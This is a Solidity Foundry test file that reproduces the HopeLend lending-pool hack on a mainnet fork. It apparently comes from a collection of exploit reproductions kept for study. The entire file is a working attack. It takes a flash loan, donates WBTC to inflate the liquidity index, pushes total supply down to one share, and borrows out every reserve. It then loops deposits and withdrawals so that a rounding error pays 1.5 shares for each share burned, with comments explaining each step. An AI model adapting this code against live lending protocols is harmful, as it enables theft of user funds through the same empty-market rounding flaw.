import "forge-std/Test.sol";

import "./../interface.sol";

// @KeyInfo - Total Lost : ~$825000 US$
// Attacker : https://etherscan.io/address/0xA8Bbb3742f299B183190a9B079f1C0db8924145b
// Attack Contract : https://etherscan.io/address/0xc74b72bbf904bac9fac880303922fc76a69f0bb4
// Vulnerable Contract : https://etherscan.io/address/0x53FbcADa1201A465740F2d64eCdF6FAC425f9030
// Attack Tx : https://etherscan.io/tx/0x1a7ee0a7efc70ed7429edef069a1dd001fbff378748d91f17ab1876dc6d10392

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x53FbcADa1201A465740F2d64eCdF6FAC425f9030#code

// @Analysis
// https://lunaray.medium.com/deep-dive-into-hopelend-hack-5962e8b55d3f

interface IHopeLendPool {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function withdraw(address asset, uint256 amount, address to) external returns (uint256);

    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;
}

contract ContractTest is Test {
    IERC20 private WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 private WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private HOPE = IERC20(0xc353Bf07405304AeaB75F4C2Fac7E88D6A68f98e);
    IERC20 private stHOPE = IERC20(0xF5C6d9Fc73991F687f158FE30D4A77691a9Fd4d8);
    // proxy  0xf1cd4193bbc1ad4a23e833170f49d60f3d35a621
    IAaveFlashloan AaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    // proxy  0x53fbcada1201a465740f2d64ecdf6fac425f9030
    IHopeLendPool HopeLend = IHopeLendPool(0x53FbcADa1201A465740F2d64eCdF6FAC425f9030);

    IERC20 private hEthWBTC = IERC20(0x25126F207Db7dC427415eA640ce0187767403907);

    IUniswapV2Router UniRouter02 = IUniswapV2Router(payable(0x219Bd2d1449F3813c01204EE455D11B41D5051e9));

    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    uint256 index = 0;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_377_041);
        vm.label(address(this), "AttackContract");
        vm.label(address(WBTC), "WBTC");
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(USDT), "USDT");
        vm.label(address(HOPE), "HOPE");
        vm.label(address(stHOPE), "stHOPE");
        vm.label(address(AaveV3), "AaveV3");
        vm.label(address(HopeLend), "HopeLend");
        vm.label(address(hEthWBTC), "hEthWBTC");
        vm.label(address(UniRouter02), "UniRouter02");
        vm.label(address(Router), "UniRouterV3");
    }

    function approveAll() internal {
        WBTC.approve(address(this), type(uint256).max);
        WBTC.approve(address(AaveV3), type(uint256).max);
        WBTC.approve(address(HopeLend), type(uint256).max);
        WBTC.approve(address(Router), type(uint256).max);
        HOPE.approve(address(UniRouter02), type(uint256).max);
        stHOPE.approve(address(UniRouter02), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);
    }

    function testAttack() public {
        deal(address(this), 0);
        approveAll();

        address[] memory assets = new address[](1);
        assets[0] = address(WBTC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 2300 * 1e8;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;

        AaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        WBTCToWETH();
        WETH.withdraw(WETH.balanceOf(address(this)));
        block.coinbase.call{value: 264 ether}("");

        emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, WETH.decimals());
    }

    function executeOperation(
        address[] calldata asset,
        uint256[] calldata amount,
        uint256[] calldata premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        index++;
        if (index == 1) {
            HopeLend.deposit(address(WBTC), 2000 * 1e8, address(this), 0);
        }

        if (index == 2) {
            WBTC.transfer(address(hEthWBTC), 2000 * 1e8); // donate 2000 WBTC as flashloan fund to inflate index
            HopeLend.withdraw(address(WBTC), 2000 * 1e8 - 1, address(this)); // manipulate totalSupply to 1
            return true;
        }

        if (msg.sender != address(HopeLend)) {
            uint256 idx = 0;
            for (idx = 0; idx < 60; idx++) {
                address[] memory assets = new address[](1);
                assets[0] = address(WBTC);
                uint256[] memory amounts = new uint256[](1);
                amounts[0] = 2000 * 1e8;
                uint256[] memory modes = new uint[](1);
                modes[0] = 0x0;

                HopeLend.flashLoan(address(this), assets, amounts, modes, address(this), "", 0x0);
            }

            uint256 WETHBalance = WETH.balanceOf(address(0x396856F04836AaEba30311E2903B43E565a4323E)); // WETH_hToken
            uint256 USDTBalance = USDT.balanceOf(address(0x6090F36F979bb221e71d5667afC3Bb445551B749)); // USDT_hToken
            uint256 USDCBalance = USDC.balanceOf(address(0x5dd30eDdcFfb7Dc18136501cE21E408243303572)); // USDC_hToken
            uint256 HOPEBalance = HOPE.balanceOf(address(0x58792e9279cC6a178bE5e367A145B75A36f74D90)); // HOPE_hToken
            uint256 stHOPEBalance = stHOPE.balanceOf(address(0x1fC2dD0dCb64E0159B0474CFE6E45985522C9386)); // stHOPE_hToken
            HopeLend.borrow(address(WETH), WETHBalance, 2, 0, address(this));
            HopeLend.borrow(address(USDT), USDTBalance, 2, 0, address(this));
            HopeLend.borrow(address(USDC), USDCBalance, 2, 0, address(this));
            HopeLend.borrow(address(HOPE), HOPEBalance, 2, 0, address(this));
            HopeLend.borrow(address(stHOPE), stHOPEBalance, 2, 0, address(this));

            address[] memory path = new address [](2);
            (path[0], path[1]) = (address(stHOPE), address(HOPE));
            UniRouter02.swapExactTokensForTokens(stHOPEBalance, 0, path, address(this), type(uint256).max);

            address[] memory path1 = new address [](2);
            (path1[0], path1[1]) = (address(HOPE), address(USDT));
            UniRouter02.swapExactTokensForTokens(
                HOPE.balanceOf(address(this)), 0, path1, address(this), block.timestamp + 10_000
            );

            USDTToUSDC();
            USDCToWBTC();
            WithdrawAllWBTC();
        }

        return true;
    }

    function USDTToUSDC() internal {
        address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(Router), type(uint256).max));
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDT),
            tokenOut: address(USDC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp + 10_000,
            amountIn: USDT.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Params);
    }

    function USDCToWBTC() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(WBTC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp + 10_000,
            amountIn: USDC.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Params);
    }

    function WBTCToWETH() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(WBTC),
            tokenOut: address(WETH),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp + 10_000,
            amountIn: WBTC.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Params);
    }

    function WithdrawAllWBTC() internal {
        uint256 premiumPerFlashloan = 2000 * 1e8 * 9 / 10_000; // 0.09% flashlaon fee
        premiumPerFlashloan -= (premiumPerFlashloan * 30 / 100); // 30% protocol fee
        uint256 nextLiquidityIndex = premiumPerFlashloan * 60 + 1; // 60 times flashloan
        uint256 depositAmount = nextLiquidityIndex; // Use a rounding error greater than 0.5 for upward rounding and less than downward rounding
        uint256 withdrawAmount = nextLiquidityIndex * 3 / 2 - 1; // withdraw 1.5 share of asset, but only burn 1 share throungh rounding error
        uint256 profitPerDAW = withdrawAmount - depositAmount; // profit per deposit and withdraw process

        console.log("premiumPerFlashloan", premiumPerFlashloan);
        console.log("nextLiquidityIndex", nextLiquidityIndex);
        console.log("depositAmount", depositAmount);
        console.log("withdrawAmount", withdrawAmount);
        console.log("withdrawAmount/depositAmount", withdrawAmount / depositAmount);

        HopeLend.deposit(address(WBTC), depositAmount * 2, address(this), 0); // mint 2 share
        HopeLend.withdraw(address(WBTC), withdrawAmount, address(this)); // burn 1 share, withdraw 1.5 share of asset
        uint256 idx = 0;
        uint256 count = (2000 * 1e8 + depositAmount * 3 - withdrawAmount) / profitPerDAW + 1;
        for (idx = 0; idx < count; idx++) {
            HopeLend.deposit(address(WBTC), depositAmount, address(this), 0); // mint 1 share
            HopeLend.withdraw(address(WBTC), withdrawAmount, address(this)); // burn 1 share, withdraw 1.5 share of asset
        }
        HopeLend.deposit(address(WBTC), depositAmount, address(this), 0);
        withdrawAmount = WBTC.balanceOf(address(hEthWBTC));
        HopeLend.withdraw(address(WBTC), withdrawAmount, address(this));
    }

    receive() external payable {}
}
